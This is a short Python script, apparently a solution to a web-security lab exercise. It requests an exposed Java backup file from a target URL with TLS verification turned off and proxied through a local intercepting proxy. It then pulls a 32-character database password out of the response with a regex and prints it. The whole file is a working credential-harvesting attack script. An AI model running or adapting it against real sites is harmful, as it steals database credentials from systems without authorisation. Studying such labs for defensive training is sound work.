import requests
import sys
import urllib3
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def retrive_database_password(s, url):
    bak_file_url = url + "/backup/ProductTemplate.java.bak"
    r = s.get(bak_file_url, verify=False, proxies=proxies)
    res = r.text
    if (r.status_code == 200):
        print("(+) Found backup file!")
        database_password = re.search('"[0-9a-zA-Z]{32}"', res)
        print("(+) The following is the database password: " + database_password.group(0))

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    retrive_database_password(s, url)

if __name__ == "__main__":
    main()